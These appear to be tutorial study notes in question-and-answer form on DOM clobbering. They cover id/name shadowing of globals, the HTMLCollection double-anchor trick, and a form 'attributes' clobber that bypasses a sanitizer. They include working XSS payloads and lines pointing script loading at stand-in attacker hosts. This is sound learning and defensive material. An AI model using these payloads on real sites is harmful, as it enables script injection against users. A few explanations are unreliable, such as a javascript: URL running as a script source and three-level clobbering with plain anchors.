**DOM Clobbering** is a technique where an attacker "overwrites" or "shadows" global JavaScript variables or properties of the `window` and `document` objects by using HTML elements with specific `id` or `name` attributes.

It occurs because browsers, for legacy compatibility reasons, automatically create global references to HTML elements that have an `id`. For example, if you have `<img id="user">`, you can access that element in JavaScript simply by typing `user`.

---
### How the "Clobber" Works

In JavaScript, when a script tries to access a variable that hasn't been explicitly defined (via `var`, `let`, or `const`), the browser looks at the `window` object. If there is an HTML element with an `ID` matching that variable name, the browser returns the **HTML element** instead of `undefined`.

**The Danger:** If a developer writes code like `if (window.config.url)`, and an attacker can inject `<a id="config" name="url" href="javascript:alert(1)">`, the attacker has "clobbered" the `config` object.

---

### Example 1: Clobbering a Global Object

Imagine a site has a script that uses a global configuration object to load a library:
```js
// Vulnerable Code
var url = window.config.url || "/default-script.js";
var script = document.createElement('script');
script.src = url;
document.body.appendChild(script);
```

If you can inject HTML (via a comment section or a profile bio), you can clobber `window.config`:

**The Exploit:**
```html
<a id="config" name="url" href="javascript:alert('Clobbered!')"></a>
```

**What happens?**

1. The browser sees the `<a>` tag. Because it has `id="config"`, it creates `window.config`.    
2. Because it has `name="url"`, the `config` object now has a property called `url`.
3. In JavaScript, when an `<a>` tag is treated as a string (like setting `script.src`), it returns the value of its `href` attribute.
4. The script now loads `javascript:alert('Clobbered!')` instead of the default script.

---

### Example 2: Clobbering Nested Properties (The Array Trick)

Clobbering a single property is easy, but what if the code looks like `window.settings.api.key`? To clobber two levels deep, you use the relationship between `id` and `name` with multiple elements.

**Vulnerable Code:**
```js
if (window.settings.api) {
    console.log("API logic running...");
}
```

**The Exploit:**
```html
<a id="settings"></a>
<a id="settings" name="api"></a>
```

When there are two elements with the same `id`, `window.settings` becomes an **HTMLCollection** (an array-like object).

1. `window.settings[0]` is the first `<a>`.    
2. `window.settings.api` returns the second `<a>` (because of the `name="api"`).
3. The `if` check passes because `window.settings.api` is now an object (the second link).

---

### Why is this common in Modern Apps?

DOM Clobbering is often used to bypass **HTML Sanitizers** (like DOMPurify).
1. A sanitizer might strip out `<script>` tags.
2. However, it often allows "safe" tags like `<a>`, `<div>`, or `<img>` with `id` and `name` attributes.
3. The attacker uses these "safe" tags to break the logic of the _existing_ legitimate scripts on the page.

---
#### Prevention:

1. **Use `let` or `const`:** Explicitly declaring variables prevents them from being shadowed by the DOM.
2. **Validate Types:** Don't just check if a variable exists; check if it’s the right type.
    - _Bad:_ `if (config.url)`
    - _Good:_ `if (typeof config.url === 'string')`
3. **Use `Object.freeze()`:** On critical configuration objects to prevent modification.
4. **Namespace your globals:** Avoid generic names like `config`, `settings`, or `user`.

---

> [!Question] Title
> What is special in using form element in clobbering? by doing 
> `<form onclick=alert(1)><input id=attributes>Click me`
### The Core Concept: The "Form-Property" Relationship

In the DOM, `<form>` elements are special. Any `input` or `button` inside a form that has an `id` or `name` is automatically added as a **property of that form**.

If you have:
```html
<form id="myForm">
  <input id="foo">
</form>
```

In JavaScript, `document.getElementById('myForm').foo` will return that `input` element.

---

### The "Attributes" Clobbering Trick

Every HTML element naturally has a property called `.attributes`. This property is a **NamedNodeMap** (basically a list) that contains all the attributes of that element (like `class`, `src`, `href`, etc.).

How a typical filter works:

When a sanitizer checks a `<form>` for malicious code, it does something like this:

```js
// A simplified sanitization loop
let element = document.querySelector('form');
for (let i = 0; i < element.attributes.length; i++) {
    let attr = element.attributes[i];
    if (attr.name.startsWith('on')) {
        element.removeAttribute(attr.name); // Remove things like onclick
    }
}
```

How the exploit "Clobbers" the logic:

When you inject `<form onclick=alert(1)><input id=attributes></form>`, you change the definition of element.attributes for that specific form.
1. **The Overwrite:** Instead of `element.attributes` pointing to the real list of attributes (`onclick`), it now points to the **`<input id=attributes>`** element.
2. **The Loop Failure:** The filter tries to run its loop: `i < element.attributes.length`.
3. **The "Undefined" Result:** An `<input>` element does **not** have a `.length` property. In JavaScript, `input.length` is `undefined`.
4. **The Loop Ends Immediately:** The condition `0 < undefined` is **false**.
5. **The Result:** The loop never runs. The filter thinks the form has no attributes to check, so it leaves the `onclick` attribute untouched.

---
### Why this is so dangerous

This technique is specifically used to bypass **Blacklist-based Sanitizers**. The sanitizer "sees" the `onclick` attribute, but because you've broken its "vision" (the `.attributes` property), it simply walks past the danger without realizing it.

### Testing this on your Linux machine

You can see this live in your browser console right now. Paste this:
```js
// 1. Create the clobbered element
const div = document.createElement('div');
div.innerHTML = "<form onclick='alert(1)'><input id='attributes'></form>";
const form = div.firstChild;

// 2. Try to access attributes like a filter would
console.log("Real attributes list?", form.attributes); 
// Output: <input id="attributes"> (This is the clobber!)

console.log("Length of attributes?", form.attributes.length);
// Output: undefined
```

### How to Prevent This

Developers can prevent this by not trusting the "shorthand" property access. Instead of `element.attributes`, they should use the **prototype** method which cannot be clobbered:
```js
// This is safe from clobbering:
let realAttributes = Object.getOwnPropertyDescriptor(Element.prototype, 'attributes').get.call(element);
```

Since you are interested in CodeQL, this is a great pattern to look for: code that iterates over `.attributes` or `.childNodes` without verifying that the returned object is actually a `NamedNodeMap` or `NodeList`.


---


> [!Question]
> i don't fully understand. what i have got is. In the normal case we do `form[index]` --> to get input index then `form[index]`.attributes to get specific attribute for each input.  the idea to overwrite `form.attributes` but idk how having another input with id=attribute does overwrite it

To understand why `<input id=attributes>` overwrites the built-in `.attributes` property, we have to look at how browsers prioritize property names.

---

### 1. The Priority Rule

In JavaScript, an object can have "own properties" (built-in) and "named properties" (from the DOM). For most elements, built-in properties win. However, the **`<form>`** element is an exception for legacy reasons.
When you try to access `myForm.something`, the browser follows this order
1. Does the form have an internal property named `something`?
2. Does the form have a **child element** (input, button, etc.) with an `id` or `name` of `something`?

The Conflict:

The attributes property is a built-in part of all HTML elements. Normally, the browser should use the built-in one. However, the way the DOM is structured for Forms allows an element with an ID to "shadow" or "clobber" that built-in property because the browser prioritizes the Named Access Map of the form children.

---
### 2. The Logic Breakdown

Let's look at what is happening inside the browser's memory.

**Normal Form:**
- `form.attributes` $\rightarrow$ Points to a `NamedNodeMap` (The list of actual HTML attributes like `id`, `class`, `onclick`).
- `form.attributes.length` $\rightarrow$ Returns a number (e.g., `2`).

**Clobbered Form:**
```html
<form onclick="alert(1)">
  <input id="attributes">
</form>
```

- `form.attributes` $\rightarrow$ The browser sees the child `<input id="attributes">`. Because it's a form, it maps the ID "attributes" directly onto the form object.
- **The Overwrite:** The child element "steps in front" of the built-in property. Now, `form.attributes` points to the **HTMLInputElement**, not the list of attributes.
- `form.attributes.length` $\rightarrow$ Since it's now an `<input>` element, it looks for the `.length` property of an input. Inputs don't have a `.length` property, so it returns `undefined`.

---

### 3. Visualizing the Filter Failure

Think of a security filter as a person walking through a door (the form) and counting the items in a basket (the attributes).
1. **Normal Case:** The filter looks at `form.attributes`, sees a basket with 5 items, and checks each one.
2. **Clobbered Case:** You have placed a sign over the basket that says "I am the attributes." The sign is actually an `<input>` tag.
3. **The Error:** The filter asks the sign, "How many items do you have?" (`.length`).
4. **The Result:** The sign doesn't know what "length" means, so it says "nothing" (`undefined`).
5. **The Bypass:** The filter thinks, "Oh, I guess there are no items to check," and moves on to the next element, leaving your malicious `onclick` attribute active on the form.

---

### 4. Why your assumption was slightly different

You mentioned: _“we do form[index] --> to get input index then form[index].attributes to get specific attribute for each input.”_

While you **can** do that to sanitize the inputs, most sanitizers (like DOMPurify or custom regex/DOM filters) sanitize the **container** (the form) itself first. They look at the `form` element and try to clean its attributes (like `onclick` or `style`) before moving inside to its children. This attack targets that **first step**—the part where the filter tries to clean the form tag itself.

---

> [!Question]
> do we need to have double tags of the element like 
`<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>`
can't we just use 
`<a id=someObject name=url href=//malicious-website.com/evil.js>`
alone

To understand why we sometimes need the "Double Tag" (the `HTMLCollection` trick) versus a "Single Tag," we have to look at the **depth** of the JavaScript property you are trying to clobber.

The rule of thumb is:
- **Single Level** (`window.someObject`): Use **one** tag.
- **Two Levels** (`window.someObject.url`): Use **two** tags (or a specific structure like a Form).
---
### 1. Why the Single Tag Fails for `obj.prop`

If you use only `<a id="someObject" name="url" href="..."></a>`, the browser creates a global reference `window.someObject` that points to that **specific anchor element**.

In JavaScript, an `<a>` element **does not** naturally have a property called `url` just because you gave it a `name="url"`.
- `window.someObject` $\rightarrow$ The `<a>` element.
- `window.someObject.url` $\rightarrow$ **`undefined`** (because the anchor doesn't have a property named "url").

### 2. How the Double Tag "Levels Up" the Object

When you use two elements with the same `ID`, the browser changes its behavior. Instead of `window.someObject` pointing to one element, it becomes an **`HTMLCollection`** (an array-like object).
```
<a id="someObject"></a>
<a id="someObject" name="url" href="https://evil.js"></a>
```

Now, the browser populates that collection. For an `HTMLCollection`, the browser automatically maps any `name` or `id` attributes of the _contained_ elements as **properties of the collection itself.**
- `window.someObject` $\rightarrow$ `HTMLCollection [a, a]`
- `window.someObject.url` $\rightarrow$ **The second `<a>` element.**

Now, if the vulnerable code is `script.src = window.someObject.url`, it will successfully grab the second anchor. Because the script expects a string and gets an object, it calls the `.toString()` method of the anchor, which returns the `href` (the malicious URL).

---

### 3. The Exception: When is one tag enough?

You **can** clobber a nested property with a single tag **only if you use a `<form>`**, as we discussed earlier.
```
<form id="someObject">
  <input name="url" value="malicious">
</form>
```

Because the `<form>` element is designed to have its named children as properties, `someObject.url` will work with just that one structure. However, many sanitizers are very aggressive with `<form>` tags, so attackers often use the "Double Anchor" trick because `<a>` tags are rarely blocked.

---

### 4. Summary Table: When to use what

|**Target Code**|**Requirement**|**Why?**|
|---|---|---|
|`if (window.config)`|**Single Tag**|Only needs to check if the global ID exists.|
|`src = config.url`|**Double Tag**|`HTMLCollection` is needed to create the `.url` property.|
|`val = a.b.c`|**3+ Tags**|You can nest them even deeper to clobber multiple levels.|

---
